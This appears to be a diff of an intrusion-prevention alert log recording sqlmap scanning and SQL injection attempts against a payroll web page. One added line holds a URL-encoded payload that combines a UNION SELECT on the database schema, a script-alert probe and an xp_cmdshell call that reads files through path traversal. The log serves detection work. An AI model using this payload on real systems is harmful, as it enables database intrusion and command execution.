@@ -3,7 +3,7 @@ attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,
 46199,291426,1,medium,sqlmap.Scanner,HTTP,192.168.1.3,192.168.2.2,37826,80,ips,signature,/payroll_app.php
 46199,291428,1,medium,sqlmap.Scanner,HTTP,192.168.1.3,192.168.2.2,37830,80,ips,signature,/payroll_app.php
 46199,291428,1,medium,sqlmap.Scanner,HTTP,192.168.1.3,192.168.2.2,37830,80,ips,signature,
-15621,291429,1,high,HTTP.URI.SQL.Injection,HTTP,192.168.1.3,192.168.2.2,37832,80,ips,signature,
+15621,291429,1,high,HTTP.URI.SQL.Injection,HTTP,192.168.1.3,192.168.2.2,37832,80,ips,signature,/payroll_app.php?bebQ=8781%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..
 15621,291429,1,high,HTTP.URI.SQL.Injection,HTTP,192.168.1.3,192.168.2.2,37832,80,ips,signature,
 46199,291430,1,medium,sqlmap.Scanner,HTTP,192.168.1.3,192.168.2.2,37834,80,ips,signature,/payroll_app.php
 46199,291430,1,medium,sqlmap.Scanner,HTTP,192.168.1.3,192.168.2.2,37834,80,ips,signature,
